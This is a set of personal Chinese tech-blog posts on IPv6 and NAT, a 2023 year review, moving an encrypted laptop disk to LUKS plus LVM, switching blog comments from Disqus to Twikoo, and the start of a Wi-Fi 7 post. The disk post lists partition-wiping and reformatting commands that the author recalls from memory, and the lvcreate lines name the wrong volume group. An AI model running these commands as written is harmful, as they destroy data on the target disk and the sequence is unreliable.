IPv6 地址的写法与 IPv4 不同，似乎没有一个专门的名称。硬要和 IPv4 对应的话，我会把它叫作「冒号分隔的十六进制」。IPv6 地址是 128 bit 的，长度是 IPv4 地址的 4 倍，人类将其分成 8 组，每组 16 bit，转成十六进制数字，再用冒号隔开。

比如 Facebook 的 IPv6 地址（之一）：

2a03:2880:f101:0083:face:b00c:0000:25de # 注意其中有 face:b00c 这样的彩蛋

每段开头的零可以省略，并且连续的全部是零的段可以用双冒号省略，比如：

2001:0db8:0000:0000:0000:0000:0000:0042

……可以简写成

2001:db8::42

CIDR 的写法与 IPv4 是一样的，即在地址后面加上斜线和数字代表前缀长度。由于 IPv6 有 128 bit，所以前缀长度从 /0 到 /128 不等。

二、IPv4 与 NAT

IPv4 地址由 32 个 bit 组成，所以总地址空间是 2³²，约等于 42 亿，去掉一些保留地址，实际可用的数量要少一些。理想环境下，每台能上网的设备都应该分到一个 IP 地址，但现在全球网民数量都不止 42 亿，更别提很多人还有多个上网设备，还有很多非人类的上网设备（ IoT ），所以这 42 亿地址是肯定不够用的。为了解决这个问题，人类发明了 NAT 这种邪恶的存在。

在理想世界里，每个家庭根据上网设备的数量分到一个对应大小的网络，家庭网络管理员把将这个网络里的地址分发给各个上网设备使用。在互联网的田园时代，当年的网民们就是这么分的。比如 1990 年时候 Apple 公司分得了 17.0.0.0/8 这个网络。根据上文的知识计算可得，这个网络有约 1678 万个 IP 地址，非常巨大。像这样巨大的网络，美国国防部分到了 14 个。还有很多类似的大网络被互联网起源地美国的公司和大学等机构瓜分（后来有些机构退还了一些）。

一共 42 亿地址，早年财大气粗地分配，后来全球网民数量又爆炸式增长，所以 IPv4 地址数量很快就不够分了。一个家庭没法再根据上网设备数量分配到对应数量的地址了，取而代之的是，运营商给一个家庭只分配一个地址，然后由路由器给家里的上网设备分配一套另一个网络里的地址只用于家庭内部通信。当家里的设备需要和外界通信的时候，就紧巴巴地共享运营商给的那个地址。这种情况下，家里那套地址就被称为内网地址，外部的地址就被称为外网地址或公网地址。理论上内网地址用什么都可以，但如果正好和公网某个网站相同，那就冲突了，所以内网地址通常是使用保留地址如 192.168.0.0/16 里的地址。这些保留地址不会被任何公网网站使用，因此不会有冲突的风险。

为什么 NAT 的邪恶的？因为上述多个设备可怜兮兮地共享一个地址的方案只能用于访问别人，不能用于被别人访问。生活在 NAT 背后的设备在网络上低人一等，它们无法直接被外网设备访问，而要通过端口转发、NAT 打洞、反向代理等各种辅助方式才能有限程度地被访问到。

NAT 只是暂时缓解 IPv4 不够的问题。刚刚说到运营商给每个家庭只分配一个公网地址，当这户人家不上网的时候，这个地址甚至可以被分配给别的家庭。但随着接入信息高速公路的家庭数量越来越多，运营商连每个家庭一个公网地址都给不起了。最终 CGNAT 被开发出来了——运营商层面再做一次 NAT。

什么比 NAT 更邪恶？多层 NAT。

三、IPv6 与 SLAAC

小时候一直听说 IPv6 地址空间非常庞大，类似「整个宇宙每一颗沙粒都能分到一个地址」这种类比。但我实际学习了 IPv6 的应用之后，我发现 IPv6 地址空间的确是很大，但并不是每个地址都能用来分给沙粒。

IPv4 组建的家庭网络常见的前缀长度是 /24，这样的网络有 256 个地址，可供 200 多台设备上网。由于不同的设备必须使用不同的地址，网络管理员需要精准地管理这些地址。 DHCP 通常被用于自动分配 IPv4 地址。新接入网络的设备（比如通过 Wi-Fi 接入的手机）向 DHCP 服务器（通常在路由器上）请求一个地址，DHCP 服务器从地址池里挑选一个空闲的地址租给上网设备，并保证该在其租期内不分配给其他设备，以免造成冲突。

IPv6 组建的家庭网络中常见的前缀长度是 /64，这也是标准规定的最小的网络尺寸。这样的网络有 2⁶⁴ = 18446744073709551616 ≈ 1.84 × 10¹⁹ 个地址。地址数量是如此之多，以至于根本不需要 DHCP 那样的中心化管理机制！目前 IPv6 常见的地址分配方式是 SLAAC ，即让上网设备自己随机生成一个，然后再检测一下这个地址是不是已经有人用了。由于 /64 的 IPv6 网络实在是太大了，所以只要生成算法够随机，第一次生成的地址几乎一定是没人用的。

支持 IPv6 的运营商会分配一个 /64 甚至 /56 的网络给家庭路由器，于是 128 bit 的前一半就确定了。家庭路由器通过 PD (prefix delegation) 向家里的设备宣布「请在这个 /64 网络里随机挑选一个地址」，设备随机生成了后一半的地址，拼上路由器给的前一半，就得到了完整的 128 bit 的 IPv6 地址。设备有了这个地址之后，就可以开始上网了。并且这个地址是全球唯一的公网地址，一切仿佛回到了互联网田园时代那样，每个设备都有公网地址，每个设备在网络上都能被访问到！

习惯了贫瘠的 IPv4 地址空间的我，第一次了解到 SLAAC 的时候非常震惊。在 IPv4 里，家庭路由器能分到一个珍贵的公网地址已经很不容易了，想要更多的地址往往要加钱。而在 IPv6 里，运营商直接给路由器发 /56 的网络，即 256 个 /64 网络，而一个 /64 网络就有 2⁶⁴ 个地址，是整个 IPv4 地址空间（2³²）的无数倍，大到可以在里面随机挑选地址用而不碰撞，并且所有的地址都是公网地址…… o_O

四、全球唯一的地址

NAT 不再是挡箭牌

NAT 的一个副产物是天然防火墙。生活在 NAT 后面的内网设备不能直接被公网设备访问到，默认也就阻隔了绝大多数来自公网的网络攻击。NAT 的这一副产物在家庭网络中有一定的好处，但同时也惯坏了一些人（比如我），觉得躲在 NAT 后面，不需要防火墙也可以躲避来自互联网的网络攻击。

然而 IPv6 网络是没有 NAT 的 （严格来说有，但不是脑子正常的人应该配的） 。一切就像田园时代的互联网一样，每台上网设备都有一个全球唯一的 IP 地址，所有设备理论上都能访问到其他设备。为了不让坏人访问家里设备，网络管理员应当在路由器上配置 IPv6 防火墙，只放行合法的流量。

但从另一个角度来说，只要防火墙允许，任意两个 IPv6 设备之间都可以互联。想在家里搭个网站不再需要搞端口转发或反向代理之类的东西了，只要有 IPv6 地址，然后在防火墙上加一条规则就行了——前提是你的网站的访客也得使用 IPv6。

隐私问题

上文说到，家庭网络中上网设备的 IPv6 地址由路由器给的前半段，加上自己随机生成的后半段组成。在早期标准中，后半段是由网卡的 MAC 地址衍生的。由于网卡地址是固定的，最终生成出来的 IPv6 地址也是固定的。对于机房里的一台服务器来说，这样生成出来的地址填到 DNS 里，就可以让全球的上网设备通过 IPv6 访问自己了。

这对服务器来说是省配置的好事，但对普通网民来说就不一定了。由于后半段固定，哪怕网民更换运营商，或是移动到别的网络（如手机和笔记本电脑使用不同场所的 Wi-Fi），其 IPv6 地址的后半段都是一样的，这使得网站可以长期追踪用户。

为了解决这个隐私问题，现在主流操作系统一般使用双地址来解决这个问题——一个相对固定的 IPv6 地址用来供别人访问，一个随机生成并定期更换的 IPv6 地址用来上网。

好算的 CIDR

IPv6 的「冒号分隔的十六进制」写法要比 IPv4 的「点分十进制」长不少，但同时，CIDR 的计算变得更加容易了。在点分十进制里，每段是 8 bit，因此只有当前缀长度是 8 的倍数的时候，网络与主机的分割线才划在「点」的位置。除了 /24 和 /16 这种阅读起来比较舒服的前缀长度，诸如 /20 和 /28 这种也是很常见网络 IPv4 前缀长度。由于这时候这时候分割线并不在点的位置，分出来的子网也就没那么直观了。我每次都记不住而用 ipcalc(1) 去算。

IPv6 有 128 bit，所以大家分网的时候也没那么抠门，从最小的 /64 往上，至少都是每次 8 bit 增长，只要是 4 的倍数，都能干净地分割到字符边界，阅读和计算起来很方便。

好看的地址

SLAAC 生成的地址是随机的，往往不怎么能简写。对于一些网络服务，比如 DNS 来说，往往需要一个简短又好看的地址方便人类记忆，这时候往往就是从庞大的地址空间里手动指定一个 IPv6 地址了。比如 Google Public DNS 的 IPv6 地址是：

# 简写 2001:4860:4860::8888 2001:4860:4860::8844 # 完整写法 2001:4860:4860:0000:0000:0000:0000:8888 2001:4860:4860:0000:0000:0000:0000:8844

通过选取有大量连续零的地址，Google 获得了简写较短的 IPv6 地址。其最后一段的 8888 和 8844 则是对应其 IPv4 地址 8.8.8.8 和 8.8.4.4 ，更加方便记忆。

由于 IPv6 地址通常使用十六进制数字书写，这 a-f 六个英文字母也可以被用来整活。比如上述 Facebook 的地址就嵌入了 face:b00c 这样的彩蛋。

对于想在手动指定的 IPv6 地址上整活的读者来说，可以参考 Hexspeak 获取灵感。
Source: wzyboy’s blog

**2023 年度总结**
2023 年度总结

以往都是在一年的最后几天写年度总结，但这篇 2023 年度总结却是拖到 2024 年才写。

Fediverse

2022 年年末的时候，由于不满 Elon Musk 对 Twitter 的管理，我像许多 Twitter 难民一样，将发表微博客的平台由 Twitter 转移到了 Fediverse。现在我使用 Fediverse 已经一年多了，感觉良好。我的 Fediverse 实例是自建的，计划是像本博客一样，至少运营十年。实例没有向公众开放注册，而是靠朋友之间口口相传，慢慢地增加了少量（不到十人）的用户入驻。有种盖了个楼自己先住进去，然后亲朋好友也都搬来成为邻居的感觉！

在 Fediverse 上，每条帖子不再限制只能 140 个字，因此有时候我本想水一篇博客，最终只是在 Fediverse 上发了一条较长的微博客。

现实生活的忙碌

2023 年四月份的时候，我和家属人生中第一次买房。七月份的时候搬家，之后就忙着各种装修和改造。以前租房的时候，想在墙上挂个东西也会受到房东的限制；现在有了自己的房子，自然是想怎么改造就怎么改造。趁着政府有补贴，我们把天然气取暖换成了电力驱动的热泵空调，把储水式热水器也换成了效率更高的即热式热水器。我自学了一些电工知识，拆开了家里各种开关盒和插座盒，甚至爬到阁楼上增加了新的电路，把家里的开关换成了智能开关，还在房间的天花板上钻孔并安装了吸顶灯。卧室的衣帽间看着也不顺眼，于是我们买了电动工具，把墙垛拆掉，改成了独立衣柜。更大一些的工程，则是请工人来更专业、更有效率地完成。

第一次买房和第一次装修，波折是少不了的。下半年花了很多时间和精力在这些事情，使得我大部分时间处在一个现实生活忙碌的状态。

未能成文的选题

综合上面两点及一些其他原因，2023 年我有好几个想写个博客的选题，最终未能成文：

买房记/装修记

整个流程的时间跨度太大，细节过多，无从下手，而且感觉与本博客的整体基调不搭，最终没写。

BackBlaze 安利文

我一直在用 BackBlaze B2 作为便宜的对象存储，2023 年我尝试了一下它的旗舰产品——整机备份服务。尝试的原因是主要是我有一些重要性较低的数据不值得搞多重备份，但又不能没有备份，我就想着只搞一份异地备份。这些数据体积又较大，传统按容量收费的服务不是很划算。想到我本来就在用 BackBlaze B2，不如试试它不限容量的 Computer Backup 服务。

BackBlaze Computer Backup 是一个订阅制服务，每个授权可用于一台计算机，存储空间是无限的（所有插在电脑上的硬盘都可以备份，包括移动硬盘但不包括网络存储）。需要取回数据的时候，可以免费下载 zip 压缩包，也可以让他们给你快递一个移动硬盘（可退还）。我用了一下感觉体验很不错，新用户引导简洁明快，客户端也小巧灵动。唯一的缺点是不支持 Linux。

当时的价格是 $70/y，现在已经涨价到 $90/y 了如果有感兴趣的读者可以使用我的注册链接获取一个月免费试用（我也可以拿一个月免费时间）。

新电脑

上一次配台式机还是 2016 年的事情了，时隔七年多，我趁着 Black Friday 配置了一台新的台式机。本来想多拍一些美美的照片，水一篇博客，但是因为装修问题，房间里比较乱，最后拼好了也懒得再拍照了。

我对电脑硬件不是很在行，在选购配件的过程中得到了不少友人的指点与帮助，在此特别感谢 @OrcaXS 的指导。

Bazzite 与 Linux Gaming

早在 Valve 刚推出 Proton 这个 Linux Gaming 大杀器的时候，我就听说 Linux 的游戏性能比 Windows 更好了，但是我一直没有正经试过——因为从 2008 年开始，我的 Linux 电脑一直是集显或是「亮机卡」，无论是什么操作系统都是没法好好玩游戏的。2023 年我配置了一台新的台式机，有了强劲的显卡（RTX 4070 Ti），也许可以考虑体验一下 Linux Gaming？友人向我推荐了 Bazzite 这个新鲜玩意儿。

Bazzite 的理念挺先进的，用 Fedora Kinoite 提供的 immutable 系统作为基础，增加一堆 Linux Gaming 所需的软件，还加上 Steam Deck 的 UI，拼出一个稳健且易用的系统。Bazzite 比起桌面操作系统，更像是个手机/游戏机的固件，整个系统作为一个整体升级，极大地减少各软件包之间 ABI 兼容性以及手动安装闭源显卡驱动的痛苦，实在出现问题了还能一键回滚。

然而我插了一块旧 SSD 到新电脑上，安装 Bazzite 实际试了下，发现 rpm-ostree 虽然理念先进，但实际上速度好慢哦。NVIDIA 的垃圾闭源驱动和 Wayland 相性也不好；开源驱动又不支持我的显卡。而且我用 Bazzite 不就是为了减少折腾获得一个开箱即用的体验吗？要是花了过多时间在折腾上，就有点本末倒置了。

算了算了，不折腾了。

书、影、游

小说/轻小说/漫画

2023 年我没有读什么新的小说，只是重读了几本以前读过的小说，还读了一些之前读的轻小说的续作。随着新的一季《无职转生》动画的上映，我把《无职转生》的轻小说从第 8 卷推到了第 20 卷。感想：第 15 卷开始剧情变得好看很多了。

电视剧/电影/动画

影视方面，我看了不少 MCU 里的电视剧，印象最佳的是 WandaVision ，之后的感觉一部不如一部。我还是挺喜欢 Marvel 的作品的，从 2008 年的 Iron Man 开始，我每一部 MCU 电影都没有错过，有些甚至专门去看了首映场。但近几年我感觉 MCU 电影的质量愈发下降了。最近的 The Marvels 我还没看，但是听说也是大烂片。

游戏

Steam 统计我 2023 年玩得时间最长的游戏——依然是 Factorio。年末假期的时候，我和几位朋友一起联机，开了一个五人局，还是挺欢乐的。

类似 Factorio 的工厂游戏 Satisfactory 在 2023 年末推出了 Early Access Update 8，加之打折，我便购入玩了一段时间。Early Access 多人模式的 bug 较多，且游戏内的剧情部分还在 WIP 感觉有点无聊，最终没有玩多久，还是回到了 Factorio 的怀抱。

《原神》我 AFK 了一段时间，但 4.0 版本枫丹上线之后，我又回归了——主线剧情还是想跟进一下的。HoYoverse 的新作《崩坏：星穹铁道》也在 2023 年正式开服了。我玩了几个月，感觉是比《原神》更轻松的叙事；一旦习惯了回合制战斗的设定，还挺好玩的。然而下半年由于现实生活的忙碌，我逐渐 AFK 了。
Source: wzyboy’s blog

**从 LUKS 迁移到 LUKS + LVM**
从 LUKS 迁移到 LUKS + LVM

本文记录一下我最近从 LUKS 迁移到 LUKS + LVM 的过程。整理是最好的复习！

背景

Device mapper 是 Linux 里将块设备映射成虚拟块设备的框架。

dm-crypt 是用 DM 进行透明加密的组件。例如：将 /dev/sda2 映射成 /dev/mapper/cryptsda2 ，则往 /dev/mapper/cryptsda2 这个块设备写入的数据会被加密后实际写入下层的 /dev/sda2 块设备里。

LUKS 是以 dm-crypt 为基础，增加了密钥管理功能的加密实现。

我的笔记本电脑是这样的分区结构：

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS nvme0n1 259:0 0 476.9G 0 disk ├─nvme0n1p1 259:1 0 512M 0 part /boot ├─nvme0n1p2 259:2 0 450.0G 0 crypt / └─nvme0n1p3 259:3 0 26.4G 0 crypt [SWAP]

一个引导分区（p1），一个主分区（p2），一个交换分区（p3）。其中主分区是用 LUKS 加密的，需要我每次开机时输入密码进行解锁；交换分区是以 plain dm-crypt 加密的，其密钥来自 /dev/urandom 提供的随机数据。交换分区以随机密钥进行加密是一种常见做法，密钥只存在于 RAM 里，关机之后交换分区就完全无法解密了，防止 RAM 里的敏感数据留在交换分区里被读取——尤其是在异常关机的时候。

休眠、但是醒不来

这样的加密交换分区有一个问题：无法休眠，确切地讲是能休眠，但是永远醒不来——因为断电之后密钥已经被丢弃了，所以重新开机的时候系统无法读取交换分区里的数据，所以无法恢复到之前的状态。

由于我的笔记本电脑几乎一直是插着电用，所以十几年来很少用到休眠的功能（更别提以前 Linux 休眠醒来之后网卡、扬声器等容易出 bug）；偶尔要带出门的话，短时间我就睡眠，长时间我就直接关机。直到最近，由于一连串巧合，我的笔记本电脑没有插电，电池耗尽，系统自动尝试进入休眠状态——成功了，然后就再也醒不来了。

更糟糕的是，systemd 在系统启动时会等待交换分区出现，但因为永远等不到，所以会浪费两分钟等待直到超时。由于「从休眠中醒来」这个任务没有完成，所以下次重启电脑的时候，systemd 还会再等两分钟超时，周而复始。

我实在是不知道如何清除掉这个 flag 让它不要再等。最终我想了个解决方案：systemd 是根据 UUID 去找交换分区的，那我新建一个喂给它不就行了？于是我从日志里找到 systemd 苦等的 UUID，再用 mkswap -U that_uuid 建立一个 swap，再重启一次，果然它就不再等了。事成之后要记得 wipefs 擦掉分区签名，否则以后就一直是明文交换分区了。

结果这样的事情又发生了几次，每次我都要重启几次来修复。痛定思痛，我决定一劳永逸地解决这个问题，不然每次（不小心）触发休眠就会很麻烦。

思路

我调研了多种方法，在虚拟机里尝试了一番，发现最简单的方法是用 LUKS + LVM。

LVM 也是基于 DM 的组件，主要用于在块设备上映射出多个逻辑卷（LV），这些 LV 类似于分区，但是不受分区表的限制，可以灵活地调整，甚至可以提供快照等功能。由于我的某些执念，我一直不愿意将两个 DM 套娃使用，因此我笔记本电脑上只有 LUKS，而 NAS 上只有 LVM。实际在虚拟机里测试了一下，发现 DM 叠叠乐也没什么大不了的，因此也就接受了。至于是将 LVM 叠在 LUKS 上，还是将 LUKS 叠在 LVM 上——当然是前者，因为后者和我现在的处境没什么太大的区别，并不能解决加密交换分区的问题。

所以我的分区调整计划是（对照前文的分区结构）：

将 450 GiB 的 p2 和 26.4 GiB 的 p3 两个分区删除，建立一个新的 476.4 GiB 的 p2 取而代之； 将新的 p2 作为 LUKS 容器，但不在里面直接创建文件系统，而是再叠一层 LVM，在里面创建两个 LV，一个作为主分区（root），一个作为交换分区（swap）。

根据我在虚拟机里的试验，这样调整过后，开机时系统会先解开 LUKS，然后按需求（全新启动还是从休眠中恢复）读取 root 和/或 swap。

实施

在折腾这些分区之前得先备份数据。我的主分区是 450 GiB，但只有 235 GiB 数据在里面。我有块 500 GB 的 SSD 移动硬盘可以暂存数据，这块移动硬盘里最大的一个分区是 377 GiB，倒是够存；但这分区没有加密，而且是 exFAT 文件系统，因此不适合把笔记本电脑里的数据直接复制进去。

那我把整个 LUKS 容器给 dd 进去？这就又太大了，而且由于加密数据块的信息熵极高，所以再怎么压缩也是塞不下的。要不在移动硬盘里创建一个 LUKS 容器然后把文件系统整个倒进去？但是我的笔记本电脑用的是 Ext4 文件系统，似乎并没有像 xfs_copy 那样只复制有用数据块的工具。我灵机一动，想到可以用 BorgBackup 直接直接读取 LUKS 解密后的明文块设备，由于 Borg repo 是加密的，所以可以存到不加密的移动硬盘里。

BorgBackup 甚至专门有个文档解释了这种用法：

首先用 zerofree 把 Ext4 文件系统里的没用的数据块归零——这工具比 dd if=/dev/zero 更环保、高效 用 borg create --read-special repo::archive /dev/mapper/luks-xxxx 备份 Ext4 所在的块设备，那些被归零的数据块几乎不会占用存储空间 用 borg extract --stdout repo::archive | dd of=/dev/mapper/xxxx 恢复 Ext4 到新的块设备上

由于以下操作都是需要对系统分区进行操作，所以我是启动进 archiso 里操作的。在退出主系统之前，先把 /etc/fstab 和 /etc/crypttab 里即将没用的条目给注释掉，防止调整完后进系统时 systemd 又在那儿苦等。

第 2 步完成之后的分区调整命令（根据记忆默写；忘记屏摄了）：

# 擦除 p2 上的 LUKS 签名防止被 cryptsetup 误读 wipefs -a /dev/nvme0n1p2 # 删除 p2 p3 并建立新的 p2 sgdisk -d 2 -d 3 -n 2 /dev/nvme0n1 # 在 p2 上创建 LUKS 容器 cryptsetup luksFormat /dev/nvme0n1p2 # 加载 LUKS 容器 cryptsetup open /dev/nvme0n1p2 lukslvm # 初始化 LVM 并创建两个 LV pvcreate /dev/mapper/lukslvm vgcreate arch /dev/mapper/lukslvm lvcreate -n root -L 450G lukslvm lvcreate -n swap -l 100%FREE lukslvm

此时应该已经有 /dev/mapper/arch-root 和 /dev/mapper/arch-swap 两个 LV 了。它们的下层设备是 /dev/mapper/lukslvm 这个 LUKS 容器，而 LUKS 容器的下层设备是 /dev/nvme0n1p2 这个 SSD 的分区。这就是 DM 叠叠乐！

此时执行第 3 步，将之前备份的 Ext4 写入到 /dev/mapper/arch-root 上。写入成功后 file -sL /dev/mapper/arch-root 或 blkid 应该能观察到和原先一样的 UUID。

上述操作中，第 2 步耗时 53 分钟，450 GiB 的文件系统（已用 235 GiB）最终被去重和压缩成 162 GiB 的 Borg repo；第 3 步将压缩后的文件系统写回 450 GiB 的块设备里，耗时 143 分钟。

恢复完成之后，需要调整一下 boot loader 传递给内核的参数：

options rd.luks.uuid=5834fee0-d5f5-4985-aef1-c55d50bd069c rd.luks.options=discard root=UUID=e15bf41d-3922-49a8-abc2-7640f66e318c rw

其中 rd.luks.uuid= 是 LUKS 容器（上文的 /dev/mapper/lukslvm ）的 UUID，因为重建了容器，所以这个值需要更新；而 root= 是主分区的 UUID，因为我整个 Ext4 导出到导入，一个字节都没有动过，所以这个值是不变的。

除了更新内核参数，还要确保 initrd 里有 LVM 相关的组件。调整完成之后，退出 archiso 重启，成功进系统！

现在分区布局变成了这样：

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS nvme0n1 259:0 0 476.9G 0 disk ├─nvme0n1p1 259:1 0 512M 0 part /boot └─nvme0n1p2 259:2 0 476.4G 0 part └─luks-5834fee0-d5f5-4985-aef1-c55d50bd069c 254:0 0 476.4G 0 crypt ├─arch-root 254:1 0 450G 0 lvm / └─arch-swap 254:2 0 26.4G 0 lvm [SWAP]

试试休眠……成功了！试试唤醒……也成功了！

再也不用小心翼翼害怕休眠了！
Source: wzyboy’s blog

**更换博客评论系统**
更换博客评论系统

最近帮家属装修她的博客，我发现装修博客比写博客有意思多了，于是也动起了装修自己博客的念头。本文记录了我把博客的评论系统从 Disqus 更换为 Twikoo 的过程。

一、越来越烂的 Disqus

本博客的搭建工具/平台经历了三个阶段：

2009 年～2010 年：搭建在 Blogger.com 上——当时 Blogger 已经被 Google 收购了；

2010 年～2017 年：「自豪地由 WordPress 驱动」——迁移到自建平台的原因我记不清了，似乎是因为 Blogger 被墙了；

2017 年～现在：使用 Lektor 静态生成。

静态博客相比 WordPress 虽然有诸多优点，但最大的问题在于评论系统很难做成静态的。我刚把博客做成静态的时候想着干脆不做评论系统了，读者如果想留言就寄送电子邮件。后来考察了一番，还是加了一个 Disqus 评论系统，但默认不加载，需要访客点击启用——我看到那一堆慢吞吞的 JavaScript 加载动画实在是心烦。

用了几年 Disqus 之后，这货逐渐走上了 enshittification 的道路。免费用户的网站将被 Disqus 强制插入广告，不仅占地面积很大，且内容多为猎奇 clickbait。请看友人的博客上被 Disqus 插入的巨幅猎奇广告：

出于未知原因，我的 Disqus 继承了一个祖父计划，因此没有广告：

但我依然对 Disqus 不满。尤其是 2021 年时，有至少十个月，甚至可能长达一年的时间，Disqus 的邮件通知完全是坏的。现在想来，难道是因为 COVID-19 的影响，Disqus 的某些基础设施崩坏了而无人发现或无法修复？

在 2022 年初的时候 Disqus 的邮件系统修好了，我又能收到邮件了——但所有的邮件都会进 Spam！直到本文写作时为止，Disqus 给我发的邮件还是会被 Gmail 归到 Spam 里。哪怕我一遍一遍点 Not Spam 也没有用：

二、静态网站评论系统考察

因为 Disqus 越来越烂，我就想找替代品，但 Disqus 又没有烂到完全不能用（尤其是我有无广告祖父计划），所以我也没有太强的动力去折腾更换。两年前，家属使用 Hugo 重建博客，也面临了评论系统选择的难题。家属并没有无广告 Disqus 账号，也不想为了评论系统交 $12/mo 的天价保护费去广告，那就自建吧？

「家属重建博客」和上文提到的「友人发现他的博客被 Disqus 插入巨幅广告」这两件事是差不多时间发生的，当时我和友人也讨论了一下自建博客评论系统的选择。最终友人为自己的博客搭建了 Golang 写的 Remark42，我为家属的博客搭建了 Python 写的 Isso，我自己的博客则继续用 Disqus。

两年后的现在，我帮家属博客装修的时候发现：友人的 Remark42 不知何时挂了，家属博客的 Isso 虽然还在跑着但是有内存泄露问题，只有 Disqus 依然在苟活。这时候我突然想通了一件事：

静态博客的优点就是无状态、轻量，不需要操心操作系统和软件更新的问题，运维成本极低；如果再自己维护一个评论系统，就把这些优点全部抵消了！

如何解决这个问题呢？像 Disqus 这样的全托管平台也是有的，但是我是不敢用的。自建平台又往往需要在自己的服务器上跑一个 Python / Node.js / Golang 程序，怎么办呢？

在对比调研各种评论系统的过程中我发现了一个全新的视角：serverless 部署。仔细想想，评论系统的后台其实需要处理的事件并不多，无非就是发表评论、拉取评论列表、编辑或删除自己发的评论，最多就是再加个邮件通知功能。这些功能都是可以在一个 HTTP 请求里完成的，这不是正是 serverless computing 最擅长的赛道吗？用 serverless 的评论系统，我就不需要担心运维问题，也不需要占用自己服务器的 RAM，同时又维持了自己对数据的掌控。

经过一些对比，我最终选择了 Twikoo 评论系统。这一评论系统支持运行在多个 serverless 平台上，使用 MongoDB 作为存储，支持消息推送和邮件通知。根据 GitHub 上的信息，作者还是一个大学生，应该是 00 后吧。顺便，Twikoo 用的消息推送 SDK 也是同一作者写的。年轻有为啊！

三、搭建 Twikoo

Twikoo 被许多简体中文独立博客所采用，搭建教程一大把。不少 serverless 平台提供一定的免费额度，足够运行 Twikoo 了，照着官方教程很快就能搭一个出来。我又写了一个脚本，把 Isso 的 SQLite 里的评论转成 Twikoo 的 JSON 格式再导入——家属的博客就这样从 Isso 迁移到了 Twikoo 评论系统。

发现了 Twikoo 的好，我也想给自己的博客换上。但作为一个 System Reboot Engineer，我对 serverless 平台的要求更高一些，我想要 IaC。家属的 Twikoo 是搭建在 Netlify 上的，而我一直在用 AWS 全家桶，为什么不试试在 AWS Lambda 上跑呢？尤其是两年前 AWS Lambda 增加了 Function URL 功能，不需要配置 API Gateway 了，使用起来更方便了。

Twikoo 本来没有专门对 AWS Lambda 做适配，于是我根据 AWS Lambda Function URL 的文档给上游贡献了一些代码，使它成功地在 AWS Lambda 上跑起来了。

AWS Lambda Function URL 的地址形如 https://axtoiiithbc3vetyqfgq7ozalu0cnkii.lambda-url.us-west-2.on.aws/ ，真的太长太丑了！反正我的博客本来就在用 AWS CloudFront，干脆加到博客的 wzyboy.im 域名下，这样还能减少一次 CORS preflight 请求！

四、导入 WordPress 及 Disqus 里的评论

七年前我从 WordPress 迁移到静态博客的时候，没有迁移评论。后来用上了 Disqus 评论，我也没把 WordPress 评论导入进去。但是现在既然用上了一个数据操作更加方便的平台（指可以直连 MongoDB 进行操作），我就想把 WordPress 和 Disqus 的评论都导入到 Twikoo 里。

Twikoo 支持导入 WordPress 的评论，然而我的 WordPress 早在七年前就已经停服了。我一直留着数据库备份，与其把整个 WordPress 复活再用插件把评论导出，不如直接对数据库进行操作，导出成 Twikoo 的格式而不是 WordPress 的格式。于是我把七年前的数据库备份导入 MariaDB，再快速糊了一个 Python 脚本 将 wp_comments 表里评论导出成 Twikoo 使用的 JSON 格式，然后在 Twikoo 的管理界面导入进去。

Twikoo 也支持导入 Disqus 的评论。我从 Spam 里捞出 Disqus 给我发的评论导入邮件之后，一键导入 Twikoo，才发现这里面居然还有不少垃圾评论（在 Twikoo 里显示为隐藏评论，只有管理员能看到）。这里面有些是真的垃圾评论，有些是 Disqus 误报的。我在 Twikoo 里对这些垃圾评论进行了处理。另外 Disqus 导出的 XML 里不包含 email 字段，无法从 Gravatar 拉取头像。别人的评论没办法，我自己的评论还是可以二次处理一下的。于是把刚刚清理过后的评论再次导出，把我发表的评论都加上我自己的邮箱等信息，然后清空 MongoDB 重新导入，这样就有头像了。

至此，旧评论全部导入到了 Twikoo 里。一共从 WordPress 导入了 1734 条评论，从 Disqus 导入了 211 条评论。其中 WordPress 的评论也包括了 2009 年从 Blogger 导出的评论。

五、尾声

Twikoo 默认打开了展示 User-Agent 的功能，会显示评论者的操作系统和浏览器信息。翻看一下老评论，看到各种 Windows XP、Google Chrome 5.x、Android 1.2 啥的，感觉好怀念！仿佛回到了十几年前，一大批 WordPress 独立博客如雨后春笋遍地蓬勃生长的时代，那时候不少博客都装了一个显示评论者操作系统和浏览器信息的插件。

在我写作本文的时候我刚好读到一篇文章，讲因为中国大陆独特网络环境——内容审查、封闭花园、移动互联网兴起导致传统网页衰落——简体中文互联网上公开的内容，尤其是较旧的内容，正在快速消亡。本博客虽然近年来更新不多，但也已经存续了 15 年，我将尽我所能让它继续存在下去，不要轻易消亡。通过复活 2009 至 2017 年间的旧评论，我也希望能为对抗 link rot尽一份绵薄之力。

那么，欢迎在全新的评论系统里留下评论。《隐私声明》也已更新。
Source: wzyboy’s blog

**UniFi U7 Pro 与 6 GHz Wi-Fi 初体验**
UniFi U7 Pro 与 6 GHz Wi-Fi 初体验

最近家里的 Wi-Fi 设备更新换代，我第一次体验到了 6 GHz Wi-Fi，第一次在手机上见到千兆网速。本文记录一下前因后果。

术语对照表

IEEE 的命名品位实在是太差了，各代 Wi-Fi 标准的名称都是晦涩难记的数字和字母。我真不知道我以前是怎么记住这些术语的。总算从 2019 年推出的 Wi-Fi 6 开始，他们增加了一套更好记的宣传名称，并追认了 Wi-Fi 5 和 Wi-Fi 4。以下为对照表：

宣传名称 实际名称 年份 Wi-Fi 8 802.11bn 2028 Wi-Fi 7 802.11be 2024 Wi-Fi 6E 802.11ax 2020 Wi-Fi 6 802.11ax 2019 Wi-Fi 5（追认） 802.11ac 2014 Wi-Fi 4（追认） 802.11n 2008 Wi-Fi 3（民间追认） 802.11g 2003 Wi-Fi 2（民间追认） 802.11a 1999 Wi-Fi 1（民间追认） 802.11b 1999 Wi-Fi 0（民间追认） 802.11 1997

值得注意的是，Wi-Fi 6 和 Wi-Fi 6E 虽然宣传名称不同，推出年份也不同，但实际的标准名称都是 802.11ax。在有些地方（比如 Android），也会把 Wi-Fi 6E 显示为 Wi-Fi 6，但 Wi-Fi 6E 和 Wi-Fi 6 有个本质区别：Wi-Fi 6E 支持 6 GHz 频率。

升级前

以前我家住小公寓，只有一层，所以一个 AP 就够了。去年搬进了双层屋，逐渐就觉得一个 AP 不是很够了。就算 AP 的发射功率再强，但如果客户端的天线不够劲的话，照样会出现连接性问题。搬家之后 AP 及其他网络设备都是放在一楼光纤接入的旁边的，在二楼的电脑通过无线上网效果还行，但是一些收发能力较弱的设备，在二楼就较容易出现断线的问题。

